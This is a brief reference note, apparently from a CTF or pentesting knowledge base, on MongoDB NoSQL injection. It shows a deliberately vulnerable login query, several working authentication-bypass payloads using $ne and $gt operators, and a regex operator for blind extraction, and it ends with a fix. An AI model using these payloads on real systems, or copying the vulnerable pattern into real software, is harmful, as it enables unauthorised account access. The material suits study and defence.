---
type: reference
category: Payloads
tags: [reference, payloads, web, nosql, injection]
---

# NoSQL Injection

The MongoDB analogue of SQL injection: instead of breaking query syntax, you smuggle query *operators* into fields the app feeds directly into a query. Backed by [[No SQLi]].

## When it applies
- Backend uses MongoDB (Mongoose, `mongodb` driver, `mongodb-memory-server`).
- The app parses a field as JSON and drops it into `find`/`findOne` without forcing it to a string.

Vulnerable pattern:
```javascript
const user = await User.findOne({
  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password,
});
```

## Auth bypass payloads

Bypass the password when you know the email:
```json
{"email":"picoplayer355@cylabacademy.org","password":{"$ne":null}}
```

Bypass both fields (match any document):
```json
{"email":{"$gt":""},"password":{"$gt":""}}
```

As a raw body where the server re-parses stringified JSON per field:
```json
{"email":"picoplayer355@cylabacademy.org","password":"{\"$ne\":null}"}
```

## Useful operators
```
{"$ne": null}      not equal -> matches any existing value
{"$gt": ""}        greater than empty string -> matches any string
{"$regex": ".*"}   pattern match (also usable for blind extraction char by char)
{"$in": [...]}     match any value in a list
```

## Notes
- The flag/token often comes back in the response body (JSON `token` field), not the page. Read the full response.
- Fix: force user input to the expected type (string); never let a field become a query object.

## Related
- [[Web App Methodology]], [[No SQLi]], [[SQLi]]
